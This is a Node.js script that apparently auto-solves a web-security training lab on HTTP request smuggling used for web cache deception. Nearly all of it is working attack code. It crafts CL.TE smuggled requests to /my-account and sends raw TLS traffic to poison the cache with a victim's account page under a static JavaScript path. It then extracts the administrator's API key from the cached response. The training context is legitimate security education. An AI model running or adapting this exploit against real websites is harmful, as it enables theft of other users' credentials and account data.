const { URL } = require('url');

const { isSolved, runLab, submitSolutionAnswer, waitForSolved } = require('./_common.cjs');
const { buildClTeSmuggleRequest, sendRawTlsRequest, sleep } = require('./_smuggling.cjs');

const TITLE = 'Exploiting HTTP request smuggling to perform web cache deception';
const PATH = '/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception';
const API_KEY_RE = /Your API Key is:\s*([A-Za-z0-9]{20,})/i;

async function sendBasicPost(hostname, host) {
  const request = [
    'POST / HTTP/1.1',
    `Host: ${host}`,
    'Content-Length: 0',
    'Connection: close',
    '',
    '',
  ].join('\r\n');
  await sendRawTlsRequest(hostname, request, 800);
}

async function triggerVictimTraffic(hostname, host, count = 3) {
  for (let index = 0; index < count; index += 1) {
    // eslint-disable-next-line no-await-in-loop
    await sendBasicPost(hostname, host);
    // eslint-disable-next-line no-await-in-loop
    await sleep(500);
  }
}

async function fetchTracking(hostname, host) {
  const request = [
    'GET /resources/js/tracking.js HTTP/1.1',
    `Host: ${host}`,
    'Connection: close',
    '',
    '',
  ].join('\r\n');
  const rawResponse = await sendRawTlsRequest(hostname, request, 1200);
  return {
    raw: rawResponse,
    body: rawResponse.split('\r\n\r\n').slice(1).join('\r\n\r\n'),
  };
}

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, labUrl }) => {
    if (await isSolved(page, labUrl)) {
      return;
    }

    const { host, hostname } = new URL(labUrl);
    await sleep(30000);

    for (const smuggledRequest of [
      [
        'GET /my-account HTTP/1.1',
        'X-Ignore: X',
      ].join('\r\n'),
      [
        'GET /my-account HTTP/1.1',
        `Host: ${host}`,
        'X-Ignore: X',
      ].join('\r\n'),
    ]) {
      const rawRequest = buildClTeSmuggleRequest(host, smuggledRequest);

      for (let attempt = 0; attempt < 14; attempt += 1) {
        // eslint-disable-next-line no-await-in-loop
        await sendRawTlsRequest(hostname, rawRequest);
        // eslint-disable-next-line no-await-in-loop
        await triggerVictimTraffic(hostname, host, 3);
        // eslint-disable-next-line no-await-in-loop
        await sleep(10000);
        // eslint-disable-next-line no-await-in-loop
        const response = await fetchTracking(hostname, host);
        const apiKey = response.body.match(API_KEY_RE)?.[1] || '';
        if (apiKey) {
          // eslint-disable-next-line no-await-in-loop
          await submitSolutionAnswer(page, apiKey);
          // eslint-disable-next-line no-await-in-loop
          if (await waitForSolved(page, labUrl, 20000, 3000)) {
            return;
          }
        }
      }
    }

    throw new Error('Cache deception did not leak the administrator API key');
  },
});
